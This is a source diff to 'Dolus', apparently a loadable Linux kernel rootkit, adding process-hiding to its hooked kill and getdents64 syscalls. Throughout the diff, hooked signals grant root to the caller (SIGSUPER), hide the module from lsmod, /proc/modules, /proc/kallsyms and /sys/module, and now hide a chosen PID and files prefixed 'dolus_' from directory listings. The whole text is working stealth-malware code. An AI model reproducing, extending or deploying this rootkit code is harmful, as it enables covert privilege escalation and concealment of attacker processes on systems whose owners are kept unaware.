@@ -178,7 +178,8 @@ https://www.man7.org/linux/man-pages/man7/signal.7.html
 */
 enum signals {
     SIGSUPER = 33, //become root
-    SIGINVIS = 34, //hide Dolus from lsmod, /proc/modules, /proc/kallsyms, /sys/module
+    SIGINVIS_DOLUS = 34, //hide Dolus from lsmod, /proc/modules, /proc/kallsyms, /sys/module
+    SIGINVIS_PROC = 35,  //hide certain process based on PID
 };
 
 //https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials
@@ -222,6 +223,8 @@ void unhide_dolus(void) {
 //hiding directories that start with PREFIX
 #define PREFIX "dolus_"
 
+//hiding process with specific PID
+char hide_pid[NAME_MAX];
 
 
 
@@ -234,6 +237,7 @@ static asmlinkage long hack_kill(const struct pt_regs *regs) {
     void hide_dolus(void);
 
     int sig = regs->si;
+    pid_t pid = regs->di;
     if (sig == SIGSUPER) {
         DEBUG_INFO("[+]Dolus: received SIGSUPER kill signal: %d\n", sig);
         DEBUG_INFO("[+]Dolus: giving root privileges\n");
@@ -241,20 +245,25 @@ static asmlinkage long hack_kill(const struct pt_regs *regs) {
         DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
         return 0;
     }
-    else if ((sig == SIGINVIS) && (hidden == 0)) {
-        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+    else if ((sig == SIGINVIS_DOLUS) && (hidden == 0)) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
         DEBUG_INFO("[+]Dolus: hiding Dolus\n");
         hide_dolus();
         hidden = 1;
         DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
         return 0;
     }
-    else if ((sig == SIGINVIS) && (hidden == 1)) {
-        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+    else if ((sig == SIGINVIS_DOLUS) && (hidden == 1)) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
         DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
         unhide_dolus();
         hidden = 0;
         DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
+        return 0;
+    }
+    else if(sig == SIGINVIS_PROC) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS_PROC kill signal: %d\n", sig);
+        sprintf(hide_pid, "%d", pid);
         return 0;
     }
 
@@ -298,7 +307,12 @@ static asmlinkage int hack_getdents64(const struct pt_regs *regs) {
         current_dir = (void *)dirent_ker + offset;
 
         /* Compare current_dir->d_name to PREFIX */
-        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
+        /* OR compare current_dir->d_name to hide_pid*/
+        if ( 
+            (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) || \
+            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && \
+                (strncmp(hide_pid, "", NAME_MAX) != 0))
+            )
         {
             /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
             if ( current_dir == dirent_ker )
@@ -352,20 +366,25 @@ static asmlinkage long hack_kill(pid_t pid, int sig) {
         DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
         return 0;
     }
-    else if ((sig == SIGINVIS) && (hidden == 0)) {
-        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+    else if ((sig == SIGINVIS_DOLUS) && (hidden == 0)) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
         DEBUG_INFO("[+]Dolus: hiding Dolus\n");
         hide_dolus();
         hidden = 1;
         DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
         return 0;
     }
-    else if ((sig == SIGINVIS) && (hidden == 1)) {
-        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
+    else if ((sig == SIGINVIS_DOLUS) && (hidden == 1)) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
         DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
         unhide_dolus();
         hidden = 0;
         DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
+        return 0;
+    }
+    else if(sig == SIGINVIS_PROC) {
+        DEBUG_INFO("[+]Dolus: received SIGINVIS_PROC kill signal: %d\n", sig);
+        sprintf(hide_pid, "%d", pid);
         return 0;
     }
     //if received kill signal is not SIGSUPER, return original syscall
@@ -402,7 +421,12 @@ static asmlinkage int hack_getdents64(unsigned int fd, struct linux_dirent64 __u
         current_dir = (void *)dirent_ker + offset;
 
         /* Compare current_dir->d_name to PREFIX */
-        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
+        /* OR compare current_dir->d_name to hide_pid*/
+        if ( 
+            (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) || \
+            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && \
+                (strncmp(hide_pid, "", NAME_MAX) != 0))
+            )
         {
             /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
             if ( current_dir == dirent_ker )
